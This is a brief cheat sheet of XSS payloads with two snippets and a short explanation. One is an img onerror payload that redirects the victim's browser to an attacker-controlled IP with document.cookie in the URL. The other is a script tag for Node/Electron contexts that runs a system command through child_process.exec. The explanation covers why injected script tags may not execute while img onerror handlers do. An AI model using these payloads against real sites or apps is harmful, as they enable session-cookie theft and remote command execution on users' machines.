## browser
```js
<img src='' onerror="document.location=`http://<ip_address>/${document.cookie}`">
```

Sometimes , the 'script' tag did not load a JavaScript source in dynamically rendered HTML is because the browser have already finished parsing the HTML document before the 'script' tag is added to the DOM.

As for the 'img' tag, it works differently because images are not executed like scripts. The browser will request the image file specified in the src attribute and display it in the document when it is loaded.

## node/electron
```js
<script>require('child_process').exec('something')</script>
```
